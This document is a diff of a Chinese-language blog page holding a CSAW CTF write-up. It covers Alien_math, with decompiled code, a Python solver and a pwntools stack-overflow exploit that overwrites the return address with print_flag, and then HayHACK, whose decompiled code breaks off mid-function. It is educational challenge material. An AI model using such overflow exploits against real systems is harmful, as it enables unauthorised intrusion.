@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>csaw部分题解 | chuwei'blog</title><meta name="author" content="chuwei"><meta name="copyright" content="chuwei"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Alien_math:我下载的alien_math用IDA分析时出现了些问题，这里借用其他师傅的图片进行分析: main函数： rand是伪随机的，这里srand没有初始化，所以它实际上总是返回相同的值。rand的输出是固定的，我们可以在v6与v5比较时下断点查看v6的值，   得到结果为v6的值为0x6b8b4567，即1804289383。 second_question:1234567891">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>csaw部分题解 | chuwei'blog</title><meta name="author" content="chuwei"><meta name="copyright" content="chuwei"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Alien_math:我下载的alien_math用IDA分析时出现了些问题，这里借用其他师傅的图片进行分析: main函数： rand是伪随机的，这里srand没有初始化，所以它实际上总是返回相同的值。rand的输出是固定的，我们可以在v6与v5比较时下断点查看v6的值，   得到结果为v6的值为0x6b8b4567，即1804289383。 second_question: void seco">
 <meta property="og:type" content="article">
 <meta property="og:title" content="csaw部分题解">
 <meta property="og:url" content="http://wysyrg.github.io/2022/08/06/csaw/index.html">
 <meta property="og:site_name" content="chuwei&#39;blog">
-<meta property="og:description" content="Alien_math:我下载的alien_math用IDA分析时出现了些问题，这里借用其他师傅的图片进行分析: main函数： rand是伪随机的，这里srand没有初始化，所以它实际上总是返回相同的值。rand的输出是固定的，我们可以在v6与v5比较时下断点查看v6的值，   得到结果为v6的值为0x6b8b4567，即1804289383。 second_question:1234567891">
+<meta property="og:description" content="Alien_math:我下载的alien_math用IDA分析时出现了些问题，这里借用其他师傅的图片进行分析: main函数： rand是伪随机的，这里srand没有初始化，所以它实际上总是返回相同的值。rand的输出是固定的，我们可以在v6与v5比较时下断点查看v6的值，   得到结果为v6的值为0x6b8b4567，即1804289383。 second_question: void seco">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://wysyrg.github.io/img/973119.jpg">
 <meta property="article:published_time" content="2022-08-06T02:41:45.488Z">
@@ -147,19 +147,109 @@
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/4.png" alt="4"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/5.png" alt="5"></p>
 <p>得到结果为v6的值为0x6b8b4567，即1804289383。</p>
-<h3 id="second-question"><a href="#second-question" class="headerlink" title="second_question:"></a>second_question:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">void</span> <span class="hljs-title function_">second_question</span><span class="hljs-params">(<span class="hljs-type">char</span> *param_1)</span><br><br>&#123;<br>  <span class="hljs-type">char</span> cVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">size_t</span> n;<br>  ulong uVar3;<br>  undefined8 local_38;<br>  undefined8 local_30;<br>  undefined8 local_28;<br>  <span class="hljs-type">int</span> i;<br>  <br>  i = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;<br>    uVar3 = SEXT48(i);<br>    n = <span class="hljs-built_in">strlen</span>(param_1);<br>    <span class="hljs-keyword">if</span> (n - <span class="hljs-number">1</span> &lt;= uVar3) &#123;<br>      local_38 = <span class="hljs-number">0x3436303439353737</span>;<br>      local_30 = <span class="hljs-number">0x3332333535323538</span>;<br>      local_28 = <span class="hljs-number">0x353232393232</span>;<br>      n = <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)&amp;local_38);<br>      iVar2 = <span class="hljs-built_in">strncmp</span>((<span class="hljs-type">char</span> *)&amp;local_38,param_1,n);<br>      <span class="hljs-keyword">if</span> (iVar2 == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Genius! One question left...\n&quot;</span>);<br>        final_question();<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Not quite. Double check your calculations.\nYou made a B. So close!\n&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You get a C. No flag this time.\n&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((param_1[i] &lt; <span class="hljs-string">&#x27;0&#x27;</span>) || (<span class="hljs-string">&#x27;9&#x27;</span> &lt; param_1[i])) <span class="hljs-keyword">break</span>;<br>    cVar1 = param_1[(<span class="hljs-type">long</span>)i + <span class="hljs-number">1</span>];<br>    iVar2 = second_question_function<br>                      ((ulong)(uint)(<span class="hljs-type">int</span>)param_1[i],(ulong)(uint)(param_1[i] + i),<br>                       (ulong)(uint)(param_1[i] + i));<br>    iVar2 = (<span class="hljs-type">int</span>)cVar1 + <span class="hljs-number">-0x30</span> + iVar2;<br>    param_1[(<span class="hljs-type">long</span>)i + <span class="hljs-number">1</span>] = (<span class="hljs-type">char</span>)iVar2 + (<span class="hljs-type">char</span>)(iVar2 / <span class="hljs-number">10</span>) * <span class="hljs-number">-10</span> + <span class="hljs-string">&#x27;0&#x27;</span>;<br>    i = i + <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Xolplsmorp! Invalid input!\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You get a C. No flag this time.\n&quot;</span>);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<h3 id="second-question"><a href="#second-question" class="headerlink" title="second_question:"></a>second_question:</h3><pre><code class="hljs c">
+<span class="hljs-type">void</span> <span class="hljs-title function_">second_question</span><span class="hljs-params">(<span class="hljs-type">char</span> *param_1)</span>
+
+&#123;
+  <span class="hljs-type">char</span> cVar1;
+  <span class="hljs-type">int</span> iVar2;
+  <span class="hljs-type">size_t</span> n;
+  ulong uVar3;
+  undefined8 local_38;
+  undefined8 local_30;
+  undefined8 local_28;
+  <span class="hljs-type">int</span> i;
+  
+  i = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;
+    uVar3 = SEXT48(i);
+    n = <span class="hljs-built_in">strlen</span>(param_1);
+    <span class="hljs-keyword">if</span> (n - <span class="hljs-number">1</span> &lt;= uVar3) &#123;
+      local_38 = <span class="hljs-number">0x3436303439353737</span>;
+      local_30 = <span class="hljs-number">0x3332333535323538</span>;
+      local_28 = <span class="hljs-number">0x353232393232</span>;
+      n = <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)&amp;local_38);
+      iVar2 = <span class="hljs-built_in">strncmp</span>((<span class="hljs-type">char</span> *)&amp;local_38,param_1,n);
+      <span class="hljs-keyword">if</span> (iVar2 == <span class="hljs-number">0</span>) &#123;
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Genius! One question left...\n&quot;</span>);
+        final_question();
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Not quite. Double check your calculations.\nYou made a B. So close!\n&quot;</span>);
+      &#125;
+      <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You get a C. No flag this time.\n&quot;</span>);
+      &#125;
+      <span class="hljs-keyword">return</span>;
+    &#125;
+    <span class="hljs-keyword">if</span> ((param_1[i] &lt; <span class="hljs-string">&#x27;0&#x27;</span>) || (<span class="hljs-string">&#x27;9&#x27;</span> &lt; param_1[i])) <span class="hljs-keyword">break</span>;
+    cVar1 = param_1[(<span class="hljs-type">long</span>)i + <span class="hljs-number">1</span>];
+    iVar2 = second_question_function
+                      ((ulong)(uint)(<span class="hljs-type">int</span>)param_1[i],(ulong)(uint)(param_1[i] + i),
+                       (ulong)(uint)(param_1[i] + i));
+    iVar2 = (<span class="hljs-type">int</span>)cVar1 + <span class="hljs-number">-0x30</span> + iVar2;
+    param_1[(<span class="hljs-type">long</span>)i + <span class="hljs-number">1</span>] = (<span class="hljs-type">char</span>)iVar2 + (<span class="hljs-type">char</span>)(iVar2 / <span class="hljs-number">10</span>) * <span class="hljs-number">-10</span> + <span class="hljs-string">&#x27;0&#x27;</span>;
+    i = i + <span class="hljs-number">1</span>;
+  &#125;
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Xolplsmorp! Invalid input!\n&quot;</span>);
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You get a C. No flag this time.\n&quot;</span>);
+  <span class="hljs-keyword">return</span>;
+&#125;
+</code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/6.png" alt="6"></p>
 <p>在用户输入的值和静态值进行比较时下断点，观察到静态值为7759406485255323229225</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/7.png" alt="7"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/8.png" alt="8"></p>
 <p>此图为second_question的伪代码，可看到a1经过了一些计算与转换</p>
 <p>则可以通过下面脚本计算出a1应该输入的值：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> ctypes<br><br>goal = <span class="hljs-string">&quot;7759406485255323229225&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">modify</span>(<span class="hljs-params">x, y, i</span>):<br>    b = ctypes.c_uint((x*<span class="hljs-number">0x30</span> + (x+i)*<span class="hljs-number">0xb</span> - <span class="hljs-number">4</span>)).value % <span class="hljs-number">10</span><br>    b += y<br>    <span class="hljs-keyword">return</span> b % <span class="hljs-number">10</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-number">7</span>)<br>current = <span class="hljs-number">7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>):<br>    g = <span class="hljs-built_in">int</span>(goal[i+<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">next</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">if</span> modify(current, <span class="hljs-built_in">next</span>, i) == g:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>)<br>            current = g<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+<pre><code class="hljs python">
+<span class="hljs-keyword">import</span> ctypes
+
+goal = <span class="hljs-string">&quot;7759406485255323229225&quot;</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">modify</span>(<span class="hljs-params">x, y, i</span>):
+    b = ctypes.c_uint((x*<span class="hljs-number">0x30</span> + (x+i)*<span class="hljs-number">0xb</span> - <span class="hljs-number">4</span>)).value % <span class="hljs-number">10</span>
+    b += y
+    <span class="hljs-keyword">return</span> b % <span class="hljs-number">10</span>
+
+<span class="hljs-built_in">print</span>(<span class="hljs-number">7</span>)
+current = <span class="hljs-number">7</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>):
+    g = <span class="hljs-built_in">int</span>(goal[i+<span class="hljs-number">1</span>])
+    <span class="hljs-keyword">for</span> <span class="hljs-built_in">next</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
+        <span class="hljs-keyword">if</span> modify(current, <span class="hljs-built_in">next</span>, i) == g:
+            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>)
+            current = g
+            <span class="hljs-keyword">break</span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/10.png" alt="10"></p>
 <p>即为7856445899213065428791</p>
 <h3 id="final-question"><a href="#final-question" class="headerlink" title="final_question:"></a>final_question:</h3><p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/9.png" alt="9"></p>
 <p> 发现final_question中存在栈溢出漏洞且文件中存在打印flag的函数：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __usercall print_flag@&lt;eax&gt;(__int64 a1@&lt;rbp&gt;)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> **v1; <span class="hljs-comment">// rsi</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> **v2; <span class="hljs-comment">// rdx</span><br>  __int64 v4; <span class="hljs-comment">// [rsp-98h] [rbp-98h]</span><br>  __int64 v5; <span class="hljs-comment">// [rsp-10h] [rbp-10h]</span><br>  __int64 v6; <span class="hljs-comment">// [rsp-8h] [rbp-8h]</span><br><br>  __asm &#123; endbr64 &#125;<br>  v6 = a1;<br>  sub_401100(<span class="hljs-string">&quot;Here is your flag: &quot;</span>);<br>  v1 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)<span class="hljs-string">&quot;r&quot;</span>;<br>  v5 = sub_401170(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v5 )<br>  &#123;<br>    sub_401130(&amp;v4, <span class="hljs-number">136LL</span>, v5);<br>    v1 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)&amp;v4;<br>    sub_401120(<span class="hljs-string">&quot;%s&quot;</span>, &amp;v4);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    sub_401100(<span class="hljs-string">&quot;Xolplsmorp! If you see this when trying your exploit remotely, contact an administrator!\n&quot;</span>);<br>  &#125;<br>  sub_401160(_bss_start);<br>  sub_401190(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> main(<span class="hljs-number">0</span>, v1, v2);<br>&#125;<br></code></pre></td></tr></table></figure>
+<pre><code class="hljs c"><span class="hljs-type">int</span> __usercall print_flag@&lt;eax&gt;(__int64 a1@&lt;rbp&gt;)
+&#123;
+  <span class="hljs-type">const</span> <span class="hljs-type">char</span> **v1; <span class="hljs-comment">// rsi</span>
+  <span class="hljs-type">const</span> <span class="hljs-type">char</span> **v2; <span class="hljs-comment">// rdx</span>
+  __int64 v4; <span class="hljs-comment">// [rsp-98h] [rbp-98h]</span>
+  __int64 v5; <span class="hljs-comment">// [rsp-10h] [rbp-10h]</span>
+  __int64 v6; <span class="hljs-comment">// [rsp-8h] [rbp-8h]</span>
+
+  __asm &#123; endbr64 &#125;
+  v6 = a1;
+  sub_401100(<span class="hljs-string">&quot;Here is your flag: &quot;</span>);
+  v1 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)<span class="hljs-string">&quot;r&quot;</span>;
+  v5 = sub_401170(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);
+  <span class="hljs-keyword">if</span> ( v5 )
+  &#123;
+    sub_401130(&amp;v4, <span class="hljs-number">136LL</span>, v5);
+    v1 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)&amp;v4;
+    sub_401120(<span class="hljs-string">&quot;%s&quot;</span>, &amp;v4);
+  &#125;
+  <span class="hljs-keyword">else</span>
+  &#123;
+    sub_401100(<span class="hljs-string">&quot;Xolplsmorp! If you see this when trying your exploit remotely, contact an administrator!\n&quot;</span>);
+  &#125;
+  sub_401160(_bss_start);
+  sub_401190(<span class="hljs-number">0LL</span>);
+  <span class="hljs-keyword">return</span> main(<span class="hljs-number">0</span>, v1, v2);
+&#125;</code></pre>
 <p>此时可以通过栈溢出获取flag</p>
 <p>接下来在gets处下断点，得到其距离栈的偏移：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/11.png" alt="11"></p>
@@ -167,19 +257,153 @@
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/12.png" alt="12"></p>
 <p>观察到输入的内容距离rbp0x10位，此时我们还需覆盖上个栈的rbp，在64下，一个地址所占字节为8位，所以总共需填充0x18的垃圾数据。然后将返回地址覆盖为print_flag的地址，即为0x00000000004014FB，</p>
 <h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><p>最后的exp如下所示：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>p=process(<span class="hljs-string">&#x27;./alien_math&#x27;</span>)<br><span class="hljs-comment">#p=remote(&quot;pwn.chal.csaw.io&quot;,5004)</span><br><br>print_flag=<span class="hljs-number">0x00000000004014FB</span><br>first_question_answer=<span class="hljs-number">1804289383</span><br>second_question_answer=<span class="hljs-number">7856445899213065428791</span><br><br>p.recvuntil(<span class="hljs-string">&quot;What is the square root of zopnol?&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(first_question_answer))<br>p.recvuntil(<span class="hljs-string">&quot;How many tewgrunbs are in a qorbnorbf?&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(second_question_answer))<br>p.recvuntil(<span class="hljs-string">&quot;How long does it take for a toblob of energy to be transferred between two quantum entangled salwzoblrs?&quot;</span>)<br>payload=<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x18</span>+p64(print_flag)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
+
+p=process(<span class="hljs-string">&#x27;./alien_math&#x27;</span>)
+<span class="hljs-comment">#p=remote(&quot;pwn.chal.csaw.io&quot;,5004)</span>
+
+print_flag=<span class="hljs-number">0x00000000004014FB</span>
+first_question_answer=<span class="hljs-number">1804289383</span>
+second_question_answer=<span class="hljs-number">7856445899213065428791</span>
+
+p.recvuntil(<span class="hljs-string">&quot;What is the square root of zopnol?&quot;</span>)
+p.sendline(<span class="hljs-built_in">str</span>(first_question_answer))
+p.recvuntil(<span class="hljs-string">&quot;How many tewgrunbs are in a qorbnorbf?&quot;</span>)
+p.sendline(<span class="hljs-built_in">str</span>(second_question_answer))
+p.recvuntil(<span class="hljs-string">&quot;How long does it take for a toblob of energy to be transferred between two quantum entangled salwzoblrs?&quot;</span>)
+payload=<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x18</span>+p64(print_flag)
+p.sendline(payload)
+p.interactive()</code></pre>
 <h2 id="HayHACK"><a href="#HayHACK" class="headerlink" title="HayHACK"></a>HayHACK</h2><p>首先对程序进行分析：</p>
-<h3 id="main-gt-sub143f"><a href="#main-gt-sub143f" class="headerlink" title="main()-&gt;sub143f():"></a>main()-&gt;sub143f():</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">init_stack</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">long</span> lVar1;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">int</span> iVar2;<br>  <br>  lVar1 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  iVar2 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> (iVar2 &lt; <span class="hljs-number">0x100000</span>) &#123;<br>    *(undefined4 *)(&amp;stack0xffffffffffbfffe8 + (<span class="hljs-type">long</span>)iVar2 * <span class="hljs-number">4</span>) = <span class="hljs-number">0xb00</span>;<br>    iVar2 = iVar2 + <span class="hljs-number">1</span>;<br>  &#125;<br>  challenge(&amp;stack0xffffffffffbfffe8);<br>  <span class="hljs-keyword">if</span> (lVar1 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="main-gt-sub143f"><a href="#main-gt-sub143f" class="headerlink" title="main()-&gt;sub143f():"></a>main()-&gt;sub143f():</h3><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">init_stack</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
+&#123;
+  <span class="hljs-type">long</span> lVar1;
+  <span class="hljs-type">long</span> in_FS_OFFSET;
+  <span class="hljs-type">int</span> iVar2;
+  
+  lVar1 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);
+  iVar2 = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">while</span> (iVar2 &lt; <span class="hljs-number">0x100000</span>) &#123;
+    *(undefined4 *)(&amp;stack0xffffffffffbfffe8 + (<span class="hljs-type">long</span>)iVar2 * <span class="hljs-number">4</span>) = <span class="hljs-number">0xb00</span>;
+    iVar2 = iVar2 + <span class="hljs-number">1</span>;
+  &#125;
+  challenge(&amp;stack0xffffffffffbfffe8);
+  <span class="hljs-keyword">if</span> (lVar1 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;
+                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>
+    __stack_chk_fail();
+  &#125;
+  <span class="hljs-keyword">return</span>;
+&#125;</code></pre>
 <p>这里创建了 一个0x100000的数组，并填充为0xb00</p>
 <p>然后进入challenge函数</p>
-<h3 id="challenge"><a href="#challenge" class="headerlink" title="challenge:"></a>challenge:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">challenge</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-built_in">stack</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">int</span> local_44;<br>  undefined8 local_38;<br>  undefined8 local_30;<br>  undefined8 local_28;<br>  undefined8 local_20;<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  iVar1 = random_value();<br>  *(undefined4 *)(<span class="hljs-built_in">stack</span> + (<span class="hljs-type">long</span>)iVar1 * <span class="hljs-number">4</span>) = <span class="hljs-number">0x1337</span>;<br>  local_38 = <span class="hljs-number">0</span>;<br>  local_30 = <span class="hljs-number">0</span>;<br>  local_28 = <span class="hljs-number">0</span>;<br>  local_20 = <span class="hljs-number">0</span>;<br>  local_44 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">2</span> &lt; local_44) &#123;<br>LAB_00101429:<br>      <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>        __stack_chk_fail();<br>      &#125;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    fwrite(<span class="hljs-string">&quot;Which haystack do you want to check?\n&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x25</span>,<span class="hljs-built_in">stdout</span>);<br>    fgets((<span class="hljs-type">char</span> *)&amp;local_38,<span class="hljs-number">0x20</span>,<span class="hljs-built_in">stdin</span>);<br>    iVar2 = atoi((<span class="hljs-type">char</span> *)&amp;local_38);<br>    <span class="hljs-keyword">if</span> (iVar2 &lt; <span class="hljs-number">0x100001</span>) &#123;<br>      <span class="hljs-keyword">if</span> (iVar2 == iVar1) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hey you found a needle! And its number is 0x%08x! That\&#x27;s it!\n&quot;</span>,<br>               (ulong)*(uint *)(<span class="hljs-built_in">stack</span> + (<span class="hljs-type">long</span>)iVar2 * <span class="hljs-number">4</span>));<br>        win();<br>      &#125;<br>      <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hey, you found a needle, but it\&#x27;s number is 0x%08x. I don\&#x27;t like that one\n&quot;</span>,<br>               (ulong)*(uint *)(<span class="hljs-built_in">stack</span> + (<span class="hljs-type">long</span>)iVar2 * <span class="hljs-number">4</span>));<br>        <span class="hljs-keyword">if</span> (local_44 == <span class="hljs-number">0</span>) &#123;<br>          <span class="hljs-built_in">puts</span>(<br>              <span class="hljs-string">&quot;Shoot, I forgot to tell you that I hid a needle in every stack. But I only have onefavorite needle&quot;</span><br>              );<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-keyword">if</span> (local_44 == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Did I mention I\&#x27;m in a hurry? I need you to find it on your next guess&quot;</span>);<br>          &#125;<br>        